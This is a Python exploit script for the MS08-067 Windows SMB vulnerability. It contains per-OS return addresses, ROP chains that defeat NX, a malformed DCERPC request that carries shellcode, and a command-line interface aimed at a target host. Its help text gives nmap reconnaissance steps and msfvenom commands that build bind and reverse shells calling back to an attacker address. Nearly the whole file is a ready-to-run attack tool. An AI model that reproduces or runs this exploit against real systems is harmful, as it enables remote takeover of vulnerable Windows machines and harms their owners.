#!/usr/bin/env python
import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify
import argparse
import traceback

try:
    # from impacket import smb
    from impacket import uuid
    # from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError:
    traceback.print_exc()
    print('Install the following library to make this script work')
    print('Impacket : https://github.com/CoreSecurity/impacket.git')
    print('PyCrypto : https://pypi.python.org/pypi/pycrypto')
    sys.exit(1)

HEADER = """\
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty\'s code
#   (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module
#   exploit/windows/smb/ms08_067_netapi
#######################################################################
"""
print(HEADER)

nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01"
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'
                       ] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445, shellcode=""):
        super(SRVSVC_Exploit, self).__init__()

        self.port = port
        self.target = target
        self.os = os

        # Gotta make No-Ops (NOPS) + shellcode = 410 bytes
        num_nops = 410 - len(shellcode)
        # Add NOPS to the front
        self.shellcode = "\x90" * num_nops + shellcode

    def __DCEPacket(self):
        if (self.os == '1'):
            print('Windows XP SP0/SP1 Universal\n')
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print('Windows 2000 Universal\n')
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print('Windows 2003 SP0 Universal\n')
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print('Windows 2003 SP1 English\n')
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print('Windows XP SP3 French (NX)\n')
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print('Windows XP SP3 English (NX)\n')
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print('Windows XP SP3 English (AlwaysOn NX)\n')
            rvasets = {
                'call_HeapCreate': 0x21286,
                'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796,
                'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296,
                'jmp eax': 0x19c6f,
                'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56,
                'mov [eax+0x10], ecx / ret': 0x10a56 + 6,
                'add eax, 8 / ret': 0x29c64
            }
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            raise RuntimeError('Not supported OS version')

        print('[-]Initiating connection')

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory(
                'ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters.
            # Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and
            # use that to establish a NetBIOS Session.
            # The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(
                remoteName='*SMBSERVER',
                remote_host='%s' % self.target,
                dstport=int(self.port),
                filename='\\browser')

        self.__trans.connect()
        print('[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = (
            "\x5c\x00"
            + "ABCDEFGHIJ" * 10
            + self.shellcode
            + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00"
            + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"
            + jumper
            + "\x00" * 2
        )
        server = (
            "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00"
            "\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00"
            "\x47\x00\x00\x00")
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        # NEW HOTNESS
        # The Path Length and the "Actual Count" SMB parameter have to match.
        # Path length in bytes is double the ActualCount field.  MaxCount also seems to match.
        # These fields in the SMB protocol store hex values in reverse byte order.
        # So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled" from 310 to 620.
        # 620 = 410 shellcode + extra stuff in the path.
        MaxCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
        Offset = "\x00\x00\x00\x00"
        ActualCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print('Exploit finish\n')


EPILOG = r"""

OS Types:

    1 -> Windows XP SP0/SP1 Universal
    2 -> Windows 2000 Universal
    3 -> Windows 2003 SP0 Universal
    4 -> Windows 2003 SP1 English
    5 -> Windows XP SP3 French (NX)
    6 -> Windows XP SP3 English (NX)
    7 -> Windows XP SP3 English (AlwaysOn NX)

NMAP Tips:

    nmap has a good OS discovery script that pairs well with this exploit:
    $ nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery

Generating Shellcode:

    $ msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b
      "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f raw -a x86 --platform windows > shellcode
    $ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b
      "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f raw -a x86 --platform windows > shellcode
    $ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b
      "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f raw -a x86 --platform windows > shellcode

"""


def parse_args():
    parser = argparse.ArgumentParser(
        epilog=EPILOG, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('target', nargs='?', metavar="HOST", help="the target SMB host")
    parser.add_argument('os', nargs='?', type=int, metavar="OS_TYPE",
                        choices=range(1, 8), help="os type (see help)")
    parser.add_argument('payload_file', nargs='?', metavar="PAYLOAD_FILE", type=argparse.FileType(
        'rb'), default=sys.stdin, help="optional file to read payload from if not stdin")
    parser.add_argument('--port', type=int, default=445, help="the SMB port to target")
    return parser.parse_args()


def main():
    args = parse_args()
    print(f"args: {vars(args)}")

    shellcode = ''.join([chr(i) for i in args.payload_file.read()])

    current = SRVSVC_Exploit(args.target, str(args.os), args.port, shellcode)
    current.start()


if __name__ == '__main__':
    main()
